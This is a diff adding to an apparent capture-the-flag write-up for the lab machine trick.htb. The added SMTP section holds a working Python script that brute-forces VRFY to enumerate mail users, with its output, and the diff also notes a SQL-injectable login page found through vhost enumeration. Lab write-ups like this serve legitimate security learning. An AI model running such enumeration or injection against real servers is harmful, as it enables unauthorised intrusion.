@@ -32,10 +32,43 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 ;; XFR size: 6 records (messages 1, bytes 231)
 ```
 
+## SMTP
+I went on a little bit of a rabbit hole with the SMTP server, but it wasn't completely useless  
+I wrote this little python script, who attempts to find valid mail users, by bruteforcing VRFY  
+```python
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+import sys
+
+rhost = "10.10.11.166"
+rport = 25
+path = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
+
+server = smtplib.SMTP(host=rhost,port=rport)
+if server.noop()[0] != 250:
+    print("[-]Connection Error")
+    sys.exit()
+
+with open(path, "r") as f:
+    users = f.read().rstrip().split("\n")
+
+for i in users:
+    vrfy = server.verify(i)
+    if vrfy[0] != 550:
+        print(vrfy)
+```
+So I could find michael ahead of time  
+```
+python3 smtp_brute.py
+(252, b'2.0.0 michael')
+```
+
 ## SQLi
 [http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb)  
   
-The preprod portal has a login page, which is vulnerable to SQli  
+the payroll portal can be found using gobuster vhost
+it has a login page, which is vulnerable to SQli  
   
 ![sqli](./sqli.png)
 
